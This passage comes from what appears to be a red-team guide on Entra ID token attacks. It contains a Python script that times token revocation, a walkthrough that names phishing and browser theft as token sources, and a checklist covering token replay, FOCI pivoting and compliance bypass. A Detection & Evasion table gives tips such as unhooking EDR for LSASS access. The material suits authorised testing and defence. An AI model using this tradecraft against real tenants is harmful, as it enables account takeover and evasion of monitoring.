    access_alive = True
    refresh_alive = True
    access_died_at = None
    refresh_died_at = None
    start_time = datetime.now(timezone.utc)
    iteration = 0
    current_access = access_token
    current_refresh = refresh_token

    # Decode initial token claims
    claims = decode_jwt_claims(access_token)
    exp = claims.get("exp")
    exp_str = datetime.fromtimestamp(exp, tz=timezone.utc).strftime(
        "%Y-%m-%dT%H:%M:%SZ") if exp else "unknown"
    aud = claims.get("aud", "unknown")
    scp = claims.get("scp", "N/A")
    upn = claims.get("upn", claims.get("preferred_username", "unknown"))
    has_cae = "cp1" in claims.get("xms_cc", "")

    log("=" * 70, log_fh)
    log("ENTRA ID TOKEN REVOCATION TIMING ASSESSMENT", log_fh)
    log("=" * 70, log_fh)
    log(f"Target user (UPN): {upn}", log_fh)
    log(f"Token audience:    {aud}", log_fh)
    log(f"Token scopes:      {scp}", log_fh)
    log(f"Token expiry:      {exp_str}", log_fh)
    log(f"CAE-capable:       {has_cae} {'(28hr lifetime, revocable)' if has_cae else '(60-90min, NOT revocable via CAE)'}", log_fh)
    log(f"Client ID:         {client_id}", log_fh)
    log(f"Poll interval:     {interval}s", log_fh)
    log(f"Assessment start:  {start_time.strftime('%Y-%m-%dT%H:%M:%SZ')}", log_fh)
    if revoke_time_str:
        log(f"Revocation time:   {revoke_time_str} (manually recorded)", log_fh)
    else:
        log("Revocation time:   NOT SET -- use --revoke-time or record manually", log_fh)
    log("=" * 70, log_fh)
    log("Waiting for IR team to trigger 'Sign Out Everywhere'...", log_fh)
    log("Press Ctrl+C to stop. Results logged to file.", log_fh)
    log("-" * 70, log_fh)

    try:
        while access_alive or refresh_alive:
            iteration += 1
            elapsed = (datetime.now(timezone.utc) - start_time).total_seconds()

            # --- Test Access Token ---
            if access_alive:
                status, body = test_access_token(current_access)
                if status == 200:
                    log(f"[Iter {iteration:>4}] [+{elapsed:>8.1f}s] ACCESS TOKEN: VALID (HTTP {status})", log_fh)
                elif status == 401:
                    access_alive = False
                    access_died_at = datetime.now(timezone.utc)
                    log(f"[Iter {iteration:>4}] [+{elapsed:>8.1f}s] ACCESS TOKEN: REVOKED (HTTP 401)", log_fh)
                    log(f"  >> Access token died at: {access_died_at.strftime('%Y-%m-%dT%H:%M:%S.%fZ')}", log_fh)
                    # Check if it was a CAE claims challenge
                    if "insufficient_claims" in body or "claims" in body.lower():
                        log("  >> Revocation method: CAE claims challenge (real-time)", log_fh)
                    else:
                        log("  >> Revocation method: Token expiry or server-side invalidation", log_fh)
                else:
                    log(f"[Iter {iteration:>4}] [+{elapsed:>8.1f}s] ACCESS TOKEN: ERROR (HTTP {status}) {body[:80]}", log_fh)

            # --- Test Refresh Token ---
            if refresh_alive:
                success, new_access, new_refresh_or_error = test_refresh_token(
                    current_refresh, client_id, tenant)
                if success:
                    log(f"[Iter {iteration:>4}] [+{elapsed:>8.1f}s] REFRESH TOKEN: VALID (exchanged successfully)", log_fh)
                    # Update tokens -- use the freshly minted ones
                    if new_access and not access_alive:
                        # Access token was revoked but refresh still works!
                        # This demonstrates the gap: refresh survives access revocation
                        log(f"  >> WARNING: Refresh token minted NEW access token after access revocation!", log_fh)
                        current_access = new_access
                        access_alive = True
                        access_died_at = None
                    if new_refresh_or_error:
                        current_refresh = new_refresh_or_error
                else:
                    refresh_alive = False
                    refresh_died_at = datetime.now(timezone.utc)
                    log(f"[Iter {iteration:>4}] [+{elapsed:>8.1f}s] REFRESH TOKEN: REVOKED", log_fh)
                    log(f"  >> Refresh token died at: {refresh_died_at.strftime('%Y-%m-%dT%H:%M:%S.%fZ')}", log_fh)
                    log(f"  >> Error: {new_refresh_or_error[:120]}", log_fh)

            # If both dead, we're done
            if not access_alive and not refresh_alive:
                break

            time.sleep(interval)

    except KeyboardInterrupt:
        log("\n[!] Assessment stopped by operator (Ctrl+C)", log_fh)

    # --- Final Report ---
    end_time = datetime.now(timezone.utc)
    log("=" * 70, log_fh)
    log("ASSESSMENT RESULTS", log_fh)
    log("=" * 70, log_fh)
    log(f"Assessment window: {start_time.strftime('%H:%M:%S')} - {end_time.strftime('%H:%M:%S')} "
        f"({(end_time - start_time).total_seconds():.0f}s total)", log_fh)

    if revoke_time_str:
        try:
            revoke_dt = datetime.fromisoformat(revoke_time_str.replace("Z", "+00:00"))
            if access_died_at:
                access_delta = (access_died_at - revoke_dt).total_seconds()
                log(f"ACCESS TOKEN revocation delay:  {access_delta:.1f}s after Sign Out", log_fh)
            else:
                log("ACCESS TOKEN: Still alive at end of assessment", log_fh)
            if refresh_died_at:
                refresh_delta = (refresh_died_at - revoke_dt).total_seconds()
                log(f"REFRESH TOKEN revocation delay: {refresh_delta:.1f}s after Sign Out", log_fh)
            else:
                log("REFRESH TOKEN: Still alive at end of assessment", log_fh)
        except ValueError:
            log(f"[!] Could not parse revoke time: {revoke_time_str}", log_fh)
    else:
        if access_died_at:
            log(f"ACCESS TOKEN died at:  {access_died_at.strftime('%Y-%m-%dT%H:%M:%S.%fZ')}", log_fh)
        else:
            log("ACCESS TOKEN: Still alive at end of assessment", log_fh)
        if refresh_died_at:
            log(f"REFRESH TOKEN died at: {refresh_died_at.strftime('%Y-%m-%dT%H:%M:%S.%fZ')}", log_fh)
        else:
            log("REFRESH TOKEN: Still alive at end of assessment", log_fh)
        log("[!] Set --revoke-time to calculate exact delay from Sign Out action", log_fh)

    log(f"CAE-capable token: {has_cae}", log_fh)
    if has_cae and access_died_at:
        log("NOTE: CAE tokens should revoke within minutes. If delay was >5 min,", log_fh)
        log("      the resource may not support CAE or CAE enforcement is misconfigured.", log_fh)
    elif not has_cae and access_died_at:
        log("NOTE: Non-CAE tokens cannot be revoked before expiry. The observed delay", log_fh)
        log("      should approximate the remaining token lifetime (up to 90 min).", log_fh)

    log("=" * 70, log_fh)


def main():
    parser = argparse.ArgumentParser(
        description="Entra ID Token Revocation Timing Assessment",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --access-token "eyJ..." --refresh-token "eyJ..." --interval 10
  %(prog)s --token-file tokens.json --revoke-time "2026-02-25T14:30:00Z"
  %(prog)s --access-token "eyJ..." --refresh-token "eyJ..." --client-id "04b07795-..."
        """)
    parser.add_argument("--access-token", help="Entra ID access token (JWT)")
    parser.add_argument("--refresh-token", help="Entra ID refresh token")
    parser.add_argument("--token-file", help="JSON file with access_token and refresh_token keys")
    parser.add_argument("--interval", type=int, default=15,
                        help="Seconds between checks (default: 15)")
    parser.add_argument("--client-id", default=DEFAULT_CLIENT_ID,
                        help=f"OAuth client ID for refresh (default: MS Office {DEFAULT_CLIENT_ID})")
    parser.add_argument("--tenant", default=DEFAULT_TENANT,
                        help="Tenant ID or 'common' (default: common)")
    parser.add_argument("--revoke-time",
                        help="ISO 8601 timestamp when Sign Out was clicked (e.g., 2026-02-25T14:30:00Z)")
    parser.add_argument("--log-dir", default=".",
                        help="Directory for log files (default: current directory)")
    args = parser.parse_args()

    # Load tokens
    access_token = args.access_token
    refresh_token = args.refresh_token

    if args.token_file:
        with open(args.token_file) as f:
            token_data = json.load(f)
        access_token = access_token or token_data.get("access_token")
        refresh_token = refresh_token or token_data.get("refresh_token")

    if not access_token and not refresh_token:
        parser.error("Provide --access-token and/or --refresh-token (or --token-file)")

    # Open log file
    log_name = LOG_FILE.format(datetime.now().strftime("%Y%m%d_%H%M%S"))
    log_path = os.path.join(args.log_dir, log_name)
    with open(log_path, "w") as log_fh:
        log(f"Logging to: {log_path}", log_fh)
        run_assessment(
            access_token=access_token or "",
            refresh_token=refresh_token or "",
            interval=args.interval,
            client_id=args.client_id,
            tenant=args.tenant,
            revoke_time_str=args.revoke_time,
            log_fh=log_fh,
        )
    print(f"\n[*] Full log saved to: {log_path}")


if __name__ == "__main__":
    main()
```

```
# Running the revocation timing assessment:

# Step 1: Obtain tokens (any method)
# Via TokenTacticsV2:
Import-Module TokenTacticsV2; $t = Get-AzureToken -Client MSGraph
$t | ConvertTo-Json | Out-File tokens.json

# Via device code phishing, AiTM, or stolen from browser

# Step 2: Start the timer script
python3 entra_revocation_timer.py --token-file tokens.json --interval 10

# Step 3: Signal the IR team to click "Sign Out Everywhere"
#   - Entra portal > Users > [user] > Revoke sessions
#   - Or: Revoke-MgUserSignInSession -UserId $userId
# Record the EXACT time they click it

# Step 4: Pass the revocation time for delta calculation
python3 entra_revocation_timer.py --token-file tokens.json \
    --revoke-time "2026-02-25T14:30:00Z" --interval 10

# Step 5: Observe output and review log file
# Expected findings:
#   - Non-CAE access tokens: survive 60-90 min after revocation
#   - CAE access tokens: should die within 1-5 min (if resource supports CAE)
#   - Refresh tokens: die quickly for "Sign Out Everywhere" but
#     ALREADY-ISSUED access tokens from the last refresh survive
#   - The script detects when refresh tokens mint NEW access tokens
#     after the original access token was revoked (the critical gap)

# Step 6: Test with different token types
# Non-CAE token (intentionally):
$nonCae = RefreshTo-MSGraph -RefreshToken $rt  # No -UseCAE flag
# CAE token:
$caeToken = RefreshTo-MSGraph -RefreshToken $rt -UseCAE
# Run both simultaneously in separate terminals for comparison
```

### 11. Practical Assessment Methodology

```
Assessment Workflow -- Entra ID Token Security Evaluation:

Phase 1: Reconnaissance
  [ ] Enumerate Conditional Access policies (see azure-enumeration.md)
  [ ] Identify which resources enforce Token Protection
  [ ] Identify which resources support CAE
  [ ] Map FOCI-eligible applications in the tenant
  [ ] Check for legacy auth protocols (IMAP/POP/SMTP)

Phase 2: Token Acquisition
  [ ] Run MFASweep to identify which services lack MFA enforcement
  [ ] Obtain tokens via authorized method (device code, credentials, etc.)
  [ ] Capture both access token AND refresh token
  [ ] Decode and analyze JWT claims (audience, scope, roles, CAE capability)
  [ ] Determine token lifetime (exp claim) and CAE status (xms_cc: cp1)
  [ ] Check for IPC token theft vectors (localhost redirect ports, WAM cache, URI schemes)

Phase 3: Token Replay & Pivoting
  [ ] Test access token replay from different IP / device
  [ ] Test refresh token exchange for new tokens
  [ ] Test FOCI pivoting -- exchange to different client IDs
  [ ] Test compliance bypass via Intune Company Portal client ID
  [ ] Verify if old refresh tokens remain valid after exchange

Phase 4: Revocation Timing
  [ ] Start revocation timer script (Section 10)
  [ ] Coordinate with IR team for "Sign Out Everywhere" action
  [ ] Measure access token revocation delay (non-CAE vs CAE)
  [ ] Measure refresh token revocation delay
  [ ] Document whether refresh tokens can mint new access tokens post-revocation

Phase 5: Defensive Gap Report
  [ ] Token Protection coverage (which platforms/apps are unprotected?)
  [ ] CAE coverage (which resources don't enforce CAE?)
  [ ] FOCI exposure (can tokens be pivoted to bypass CA policies?)
  [ ] Revocation timing (how long do tokens survive after Sign Out?)
  [ ] Managed Identity exposure (is MSP enabled on Azure resources?)
```

```
Tool Matrix for Entra ID Token Assessment:
| Tool              | Primary Use                          | Token Types        |
|-------------------|--------------------------------------|--------------------|
| TokenTacticsV2    | Token acquisition, FOCI pivoting     | Access, Refresh    |
| ROADtools/roadtx  | Device registration, PRT operations  | PRT, Access        |
| AADInternals      | Full Entra manipulation, PRT ops     | All types          |
| TokenSmith        | Compliance bypass, FOCI exploitation | Access, Refresh    |
| TokenFlare        | Serverless AiTM phishing             | Session cookies    |
| EntraTokenAid     | PowerShell token acquisition (CAE)   | Access, Refresh    |
| EntraFalcon       | Enumeration with first-party bypass  | Access             |
| GraphRunner       | Post-exploitation Graph API toolset  | Access             |
| Burp Suite        | Traffic interception, JWT inspection | All in transit     |
| MFASweep          | Test per-service MFA enforcement     | Identifies 1FA gaps|
| Maester           | Pester-based Entra ID config review  | Config audit       |
| AzureHound        | Graph-based attack path analysis     | Access             |
| MicroBurst        | Azure config & credential audit      | Credential harvest |
| jwt.ms            | Online JWT decoder (Microsoft)       | Access, ID tokens  |
| jwt.io / jwt-cli  | JWT decode / offline CLI inspection  | Access, ID tokens  |
| Cookie-Editor     | Browser cookie import/export         | Session cookies    |

# Quick reference -- common client IDs for token operations:
# d3590ed6-52b3-4102-aeff-aad2292ab01c = Microsoft Office (FOCI, general purpose)
# 04b07795-8ddb-461a-bbee-02f9e1bf7b46 = Azure CLI (Azure management)
# 1950a258-227b-4e31-a9cf-717495945fc2 = Azure PowerShell
# 9ba1a5c7-f17a-4de9-a1f1-6178c8d51223 = Intune Company Portal (compliance bypass)
# 1fec8e78-bce4-4aaf-ab1b-5451cc387264 = Microsoft Teams
# 00000002-0000-0ff1-ce00-000000000000 = Office 365 Exchange Online (I SPy target)
```

---

## Detection & Evasion

| Technique                     | Log Source / Event                       | Evasion Notes                                |
|-------------------------------|------------------------------------------|----------------------------------------------|
| JWT decode/analysis           | None (offline operation)                 | Fully offline, no detection possible         |
| Access token replay           | Sign-in log: token usage from new IP     | Use VPN to match victim's expected location  |
| Refresh token exchange        | Sign-in log: token refresh event         | Use same client_id as original issuance      |
| FOCI token pivoting           | Sign-in: different client_id on refresh  | FOCI exchanges blend with normal multi-app use|
| PRT extraction (DevTools)     | None (local browser operation)           | No network indicators                        |
| PRT extraction (Mimikatz)     | Process access to LSASS                  | Use direct syscalls, unhook EDR              |
| Pass-the-PRT                  | Sign-in from new device (same PRT)       | Use from same network/device as victim       |
| Pass-the-Cookie               | Session from new IP with existing cookie | Match expected IP range via proxy            |
| Managed Identity token theft  | VM metadata access logs (if MSP enabled) | Pre-MSP VMs have no logging for IMDS calls   |
| Revocation timer script       | Repeated Graph API calls (/me)           | Use low interval (30-60s) to reduce noise    |
| Burp interception             | None (local proxy)                       | No server-side detection of proxy usage      |
| TokenSmith compliance bypass  | Intune Company Portal sign-in            | Legitimate enrollment flow pattern           |
| TokenFlare AiTM               | Sign-in from Cloudflare IP range         | Rotate Workers; IP range is shared           |

---

## Cross-References

- [Azure AD / Entra ID Attacks](azure-ad-attacks.md) -- PRT abuse, device code phishing, consent attacks, CVE-2025-55241
- [Azure Defenses & Bypass](azure-defenses-bypass.md) -- CA policy gaps, Token Protection limits, CAE bypass, MFA bypass
- [Azure Initial Access](azure-initial-access.md) -- Device code phishing, OAuth consent phishing, password spraying
- [Azure Persistence](azure-persistence.md) -- SP credential addition, app secret persistence, Golden SAML
- [Azure Enumeration](azure-enumeration.md) -- Post-auth enumeration of users, groups, roles, CA policies
- [Azure Data Mining](azure-data-mining.md) -- Data extraction after identity compromise
- [Cloud Lateral Movement](../../09-lateral-movement/cloud-lateral.md) -- Cross-cloud token usage, Pass-the-PRT lateral paths
- [M365 Initial Access](../../02-initial-access/office365-initial-access.md) -- AiTM phishing, device code phishing campaigns
- [Phishing Payloads](../../02-initial-access/phishing-payloads.md) -- Delivery mechanisms for token theft phishing

## References

- TokenTacticsV2: https://github.com/f-bader/TokenTacticsV2
- ROADtools: https://github.com/dirkjanm/ROADtools
- AADInternals: https://github.com/Gerenios/AADInternals
- TokenSmith: https://github.com/JumpsecLabs/TokenSmith
- TokenFlare: https://github.com/JumpsecLabs/TokenFlare
- EntraTokenAid: https://github.com/zh54321/EntraTokenAid
- EntraFalcon: https://blog.compass-security.com/2025/04/introducing-entrafalcon/
- GraphRunner: https://github.com/dafthack/GraphRunner
- FOCI Client IDs (Secureworks): https://github.com/secureworks/family-of-client-ids-research
- PRT Exploitation (Pulse Security): https://pulsesecurity.co.nz/articles/exploiting-entraid-prt
- PRT Phishing (dirkjanm): https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/
- Cookie-Bite (Varonis): https://www.varonis.com/blog/cookie-bite
- Token Protection Bypass: https://rootsecdev.medium.com/evading-token-protection-for-entraid-m365-2024-edition
- Compliant Device Bypass: https://www.glueckkanja.com/en/posts/2025-01-14-compliant-device-bypass
- CAE Documentation: https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-continuous-access-evaluation
- Refresh Token Lifetimes: https://learn.microsoft.com/en-us/entra/identity-platform/refresh-tokens
- Configurable Token Lifetimes: https://learn.microsoft.com/en-us/entra/identity-platform/configurable-token-lifetimes
- MSP (Metadata Security Protocol): https://techcommunity.microsoft.com/blog/azurecompute/introducing-metadata-security-protocol-msp/4471204
- TrustedSec Hacking Cloud Tokens 2.0: https://trustedsec.com/blog/hacking-your-cloud-tokens-edition-2-0
- Evilginx AiTM: https://news.sophos.com/en-us/2025/03/28/stealing-user-credentials-with-evilginx/
- MFASweep: https://github.com/dafthack/MFASweep
- MicroBurst: https://github.com/NetSPI/MicroBurst
- AzureHound: https://github.com/BloodHoundAD/AzureHound
- Maester (Entra ID Config Review): https://github.com/maester365/maester
- CVE-2025-55241 (Actor Token): https://practical365.com/death-by-token-understanding-cve-2025-55241/
